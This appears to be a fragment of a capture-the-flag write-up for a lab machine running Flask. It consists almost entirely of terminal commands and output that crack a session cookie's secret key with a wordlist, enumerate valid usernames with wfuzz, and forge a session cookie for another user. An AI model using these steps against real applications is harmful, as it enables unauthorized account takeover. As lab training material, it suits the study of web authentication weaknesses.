```bash
$ flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiaXZhbiJ9.Yx8F8A.3E2RarZVbuyvi0vtT8ZySA1O99Q' --no-literal-eval                                                   1 ⨯
[*] Session decodes to: {'logged_in': True, 'username': 'ivan'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17152 attempts
b'secret123'
```


### find username
```bash
$ wfuzz -w /opt/SecLists/Usernames/Names/names.txt -u "http://10.10.11.160:5000/login" -d "username=FUZZ&password=123" --sh 2025
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.160:5000/login
Total requests: 10177

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

000001208:   200        68 L     110 W      2025 Ch     "blue"                                                                                                                                                                      
000004413:   200        68 L     110 W      2025 Ch     "ivan"                                                                                                                                                                      

Total time: 156.3967
Processed Requests: 10177
Filtered Requests: 10175
Requests/sec.: 65.07167
```

### generate cookie
```
$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
```
